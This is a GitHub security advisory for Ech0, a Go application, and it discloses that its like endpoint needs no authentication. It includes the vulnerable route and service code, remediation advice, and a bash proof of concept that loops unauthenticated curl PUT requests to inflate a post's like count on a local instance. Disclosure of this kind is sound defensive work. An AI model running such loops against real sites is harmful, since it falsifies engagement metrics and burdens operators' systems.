# [M] Ech0's Unauthenticated Like Endpoint Enables Arbitrary Engagement Metric Inflation

## Summary
Severity: Medium
Advisory: GHSA-rgj7-vg8v-j4wr
CWE: CWE-306, CWE-862
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-rgj7-vg8v-j4wr
Type: github-advisory

## Affected
- Go: `github.com/lin-snow/ech0` — affected >=0 <1.4.8-0.20260503040728-a7e8b8e84bd1

## Details
### Summary

**No authentication** is required to invoke **`PUT /api/echo/like/:id`**. The handler is registered on the **public** router group. The service increments **`fav_count`** for the given echo **without** checking identity, **without** a per-user limit, and **without** CSRF tokens. A remote client can **arbitrarily inflate** like metrics with repeated requests.

### Description

**Root cause:** The like endpoint is explicitly public (`PublicRouterGroup`). `LikeEcho` in the service layer only runs a repository increment inside a transaction—no viewer/user binding.

**Security boundary that fails:** **Integrity** of engagement metrics (likes) and any trust that “likes” represent distinct or authenticated users.

**Exploitation:** Discover or guess a public echo UUID (timeline, API, share link) → send **unauthenticated** `PUT` repeatedly → **`fav_count`** increases linearly.

### Affected files

| Public route registration | `internal/router/echo.go` |
| Like mutation (no auth check) | `internal/service/echo/echo.go` |
| Handler | `internal/handler/echo/echo.go` |

### Vulnerable / relevant code

**Public PUT route:**

```11:13:Ech0/internal/router/echo.go
	// Public
	appRouterGroup.PublicRouterGroup.PUT("/echo/like/:id", h.EchoHandler.LikeEcho())
	appRouterGroup.PublicRouterGroup.GET("/tags", h.EchoHandler.GetAllTags())
```

**Service does not use viewer / rate limit:**

```244:248:Ech0/internal/service/echo/echo.go
func (echoService *EchoService) LikeEcho(ctx context.Context, id string) error {
	return echoService.transactor.Run(ctx, func(txCtx context.Context) error {
		return echoService.echoRepository.LikeEcho(txCtx, id)
	})
}
```

### Execution flow

1. Client resolves `ECHO_ID` (e.g. `GET /api/echo/page` with any valid token, or from UI).
2. Client sends **`PUT /api/echo/like/{ECHO_ID}`** with **no** `Authorization` header.
3. Gin matches **public** route → handler → `EchoService.LikeEcho` → DB increments **`fav_count`**.
4. Repeat N times → count increases by N.

### Proof of concept

```bash
BASE="http://127.0.0.1:6277"

OWNER_TOKEN=$(curl -sS -X POST "$BASE/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"owner","password":"OwnerPass123"}' | jq -r '.data')

ECHO_ID=$(curl -sS "$BASE/api/echo/page?page=1&page_size=1" \
  -H "Authorization: Bearer $OWNER_TOKEN" | jq -r '.data.items[0].id')

# Single unauthenticated like
curl -sS -w "\nHTTP:%{http_code}\n" -X PUT "$BASE/api/echo/like/$ECHO_ID"

# Inflate (e.g. 55 times); expect HTTP 200 each time
for i in $(seq 1 55); do
  curl -sS -o /dev/null -w "%{http_code}\n" -X PUT "$BASE/api/echo/like/$ECHO_ID"
done

# Observe fav_count
curl -sS "$BASE/api/echo/$ECHO_ID" | jq '.data | {id, fav_count}'
```

**Observed proof (manual test):**

- Each unauthenticated `PUT` returned **HTTP `200`** with success JSON (e.g. `点赞Echo成功`, `code:1`).
- **`fav_count`** increased to **113** , demonstrating **linear inflation from one client** with **no authentication**.
<img width="1109" height="188" alt="Screenshot 2026-04-01 105522" src="https://github.com/user-attachments/assets/a725cf10-d20b-45a1-95bb-2e8ea396c08c" />


### Impact

**Like counts and ranking/social proof** can be falsified; feeds or “popular” logic tied to `fav_count` are untrustworthy. 
high-volume loops add DB write load; possible abuse against availability at scale. 

**Attacker capability:** Anyone on the network can manipulate **public** engagement metrics for any known echo id. Combined with permissive **CORS** browsers could automate cross-origin requests.

## Remediation 
 Require authentication for likes and enforce **one like per principal**, **or** keep anonymous likes but add **rate limiting**, **proof-of-work / captcha**, or **signed tokens** tied to anon sessions; document that counts are **not** auditor-grade metrics.

## References
- https://github.com/lin-snow/Ech0/security/advisories/GHSA-rgj7-vg8v-j4wr
- https://github.com/lin-snow/Ech0/commit/a7e8b8e84bd1e3db090dfb720f2c6c433356b442
- https://github.com/lin-snow/Ech0
